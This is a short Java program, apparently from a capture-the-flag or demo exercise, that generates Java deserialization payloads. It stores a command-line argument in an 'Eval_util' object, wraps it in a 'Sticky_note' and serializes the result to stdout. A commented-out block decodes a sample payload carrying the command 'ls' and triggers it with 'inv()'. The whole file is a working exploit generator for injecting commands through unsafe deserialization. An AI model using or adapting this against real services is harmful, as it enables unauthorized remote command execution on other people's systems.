
package com.example.demo;
import java.io.*;
import java.util.Base64;
import com.example.demo.Sticky_note;

public class Main {
    public static void main(String[] args) {
        Eval_util data = new Eval_util();
        data.val = args[0];
        //System.out.println(data.val);
        Sticky_note st = new Sticky_note(args[1],1);
        st.data = data;
        //System.out.println(st.data.val);
        try {
            FileOutputStream out = new FileOutputStream("/dev/stdout");
            ObjectOutputStream oout = new ObjectOutputStream(out);

            oout.writeObject(st);
            oout.flush();
            //System.out.println();

            //oout.writeObject(data);
            //oout.flush();

            /*final byte[] decodedBytes = Base64.getDecoder().decode("bHMKrO0ABXNyABxjb20uZXhhbXBsZS5kZW1vLlN0aWNreV9ub3RlfN8pR3BZSqQCAANJAAJpZEwABGRhdGF0ABxMY29tL2V4YW1wbGUvZGVtby9FdmFsX3V0aWw7TAAFbm90ZXN0ABJMamF2YS9sYW5nL1N0cmluZzt4cAAAAAFzcgAaY29tLmV4YW1wbGUuZGVtby5FdmFsX3V0aWyMKPICwK1BvwIAAUwAA3ZhbHEAfgACeHB0AAJsc3QAA3h5eg==");
            final ByteArrayInputStream ois = new ByteArrayInputStream(decodedBytes);
            final ObjectInput in = new ObjectInputStream(ois);
            final Sticky_note result = (Sticky_note)in.readObject();
            result.inv();
            System.out.println();
            System.out.println(result.data);*/
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
